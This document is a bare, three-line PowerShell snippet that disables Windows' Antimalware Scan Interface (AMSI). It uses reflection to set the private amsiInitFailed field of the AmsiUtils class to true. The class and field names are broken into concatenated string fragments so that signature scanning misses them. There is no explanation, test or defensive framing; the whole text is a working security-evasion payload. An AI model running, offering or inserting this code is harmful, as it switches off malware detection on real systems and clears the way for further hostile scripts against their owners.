$amsi=[Ref].Assembly.GetType('Sys'+'tem.M'+'ana'+'gem'+'ent.Au'+'tom'+'ation.Am'+'siUtils')
$file=$amsi.GetField('amsi'+'Init'+'Failed','Non'+'Publ'+'ic,St'+'atic')
$file.SetValue($null,$true)
